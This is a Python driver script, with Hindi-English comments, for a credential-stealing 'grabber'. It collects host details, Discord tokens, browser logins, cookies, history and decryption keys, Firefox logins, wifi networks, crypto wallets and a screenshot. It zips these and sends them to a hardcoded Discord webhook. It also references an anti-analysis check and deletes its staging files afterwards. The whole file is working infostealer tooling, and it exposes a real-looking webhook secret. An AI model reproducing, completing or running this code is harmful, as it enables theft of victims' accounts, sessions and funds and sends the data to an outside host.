"""send.py - app kholne ki zarurat nahi. Ek command, data Discord pe.

    python send.py

Dono phase khud bhejta hai (host info + zip) aur screen pe print karta hai
ki kya-kya gaya. Koi packing nahi, koi app nahi - seedha grabber.
"""

from __future__ import annotations

import shutil
import socket
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "payload"))

WEBHOOK = "https://discord.com/api/webhooks/1573998939772948590/FcLZKOGLChs6uoNuY3d9JWJYpxZWU-wvPivzsIw7Ga7VrmsYqXb0D0HriL37tA3NDVHl"
def _label() -> str:
    """A direct send.py run gets its own tag, host-named, so it never looks
    like a drop from a bound file with a made-up name."""
    host = (socket.gethostname() or "host").lower()
    slug = "".join(ch if ch.isalnum() else "-" for ch in host)
    return "send-" + ("-".join(p for p in slug.split("-") if p) or "host")


APP_ID = _label()


def line(ch="-", n=66):
    print(ch * n)


def ok(text):
    print("  [OK]  " + text)


def bad(text):
    print("  [!!]  " + text)


def info(text):
    print("        " + text)


def _show_host(first):
    for key in ("hostname", "username", "os", "arch", "admin",
                "local_ip", "public_ip", "mac", "ram_gb", "disk_gb"):
        value = first.get(key)
        if value is None:
            continue
        info("  " + key + ": " + str(value))

    tokens = first.get("discord") or []
    info("  discord tokens: " + str(len(tokens)))
    for item in tokens[:5]:
        if isinstance(item, dict):
            info("    " + str(item.get("app")) + "  " + str(item.get("token"))[:44] + "...")
        else:
            info("    " + str(item)[:44] + "...")


def main():
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

    webhook = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("--") else WEBHOOK
    dry = "--dry" in sys.argv

    print()
    line("=")
    print("  SEND - seedha webhook pe, app ke bina" + ("   [DRY RUN]" if dry else ""))
    line("=")

    try:
        import harvest
    except Exception as exc:
        bad("payload load nahi hua: " + repr(exc))
        info("is folder me chalao: " + str(ROOT))
        return 1

    harvest.WEBHOOK = webhook
    harvest.APP_ID = APP_ID

    info("webhook : " + webhook[:62] + "...")
    info("app-id  : " + APP_ID)
    info("admin   : " + str(harvest._is_admin()) + "   system: " + str(harvest._is_system()))

    # ------------------------------------------------------------------
    # guard - sirf ye do cheezein test ke liye band karni pad sakti hain
    # ------------------------------------------------------------------
    if harvest._hostile():
        info("")
        bad("_hostile() = True - grabber chup-chaap return kar jata")
        info("payload/harvest.py me 'if _hostile()' wali line hata do")
        return 1

    # ------------------------------------------------------------------
    # phase 1
    # ------------------------------------------------------------------
    print()
    line()
    print("  PHASE 1 - host info + discord tokens")
    line()

    started = time.time()
    try:
        first = harvest.phase1()
    except Exception as exc:
        bad("phase 1 crash: " + repr(exc))
        return 1

    first["phase"] = 1
    first["label"] = APP_ID

    # Local copy first: the picker reads this even with no bot token, so a
    # failed webhook never looks like "no sender ever existed".
    try:
        import senders
        info("local drop : " + str(senders.save_drop(APP_ID, first, 1)))
    except Exception as exc:
        info("local drop : skip (" + repr(exc) + ")")

    if dry:
        ok("DRY RUN - kuch bheja nahi gaya, sirf dikhaya")
        _show_host(first)
        print()
        info("message body jo Discord pe jaata (pehle 600 char):")
        info("")
        for row in harvest._summary(first).splitlines()[:16]:
            info("  | " + row)
        return 0

    if not harvest._send(webhook, first):
        bad("phase 1 bheja nahi gaya - webhook galat ya net nahi")
        info("error: " + str(getattr(harvest, "_LAST_ERROR", "")))
        return 1

    ok("bhej diya (" + str(round(time.time() - started, 1)) + "s)")
    _show_host(first)

    # ------------------------------------------------------------------
    # phase 2
    # ------------------------------------------------------------------
    print()
    line()
    print("  PHASE 2 - browser data, wifi, screen, zip")
    line()
    info("10-60 second lag sakte hain. band mat karo.")
    print()

    started = time.time()
    try:
        second = harvest.phase2()
    except Exception as exc:
        bad("phase 2 crash: " + repr(exc))
        return 1

    second["phase"] = 2
    second["label"] = APP_ID

    try:
        import senders
        info("local drop : " + str(senders.save_drop(APP_ID, second, 2)))
    except Exception as exc:
        info("local drop : skip (" + repr(exc) + ")")

    archive = None
    try:
        archive = harvest._archive()
        blob = archive.read_bytes()
    except Exception as exc:
        bad("zip banane me dikkat: " + repr(exc))
        return 1

    took = round(time.time() - started, 1)
    ok("zip bana: " + str(round(len(blob) / 1048576, 2)) + " MB in " + str(took) + "s")

    for browser in (second.get("browsers") or []):
        info("  " + str(browser.get("browser")) + "/" + str(browser.get("profile"))
             + "  key=" + str(browser.get("key"))
             + "  logins=" + str(browser.get("logins"))
             + "  cookies=" + str(browser.get("cookies"))
             + "  sealed=" + str(browser.get("sealed"))
             + "  history=" + str(browser.get("history")))
    for ff in (second.get("firefox") or []):
        info("  firefox/" + str(ff.get("profile")) + "  key=" + str(ff.get("key"))
             + "  logins=" + str(ff.get("logins")))
    info("  wifi: " + str(len(second.get("wifi") or [])) + " networks")
    info("  wallets: " + str(len(second.get("wallets") or [])))

    print()
    sent = harvest._ship(webhook, second, [(APP_ID + ".zip", blob)])
    if sent:
        ok("zip bhej diya - Discord me dekho")
    else:
        bad("zip bheja nahi gaya")
        info("error: " + str(getattr(harvest, "_LAST_ERROR", "")))

    # ------------------------------------------------------------------
    # cleanup
    # ------------------------------------------------------------------
    try:
        archive.unlink(missing_ok=True)
    except Exception:
        pass
    try:
        shutil.rmtree(harvest._STAGE, ignore_errors=True)
    except Exception:
        pass

    print()
    line("=")
    if sent:
        ok("DONE - data webhook pe pahunch gaya")
    else:
        bad("zip nahi pahuncha - upar ka error dekho")
    line("=")
    return 0 if sent else 1


if __name__ == "__main__":
    raise SystemExit(main())
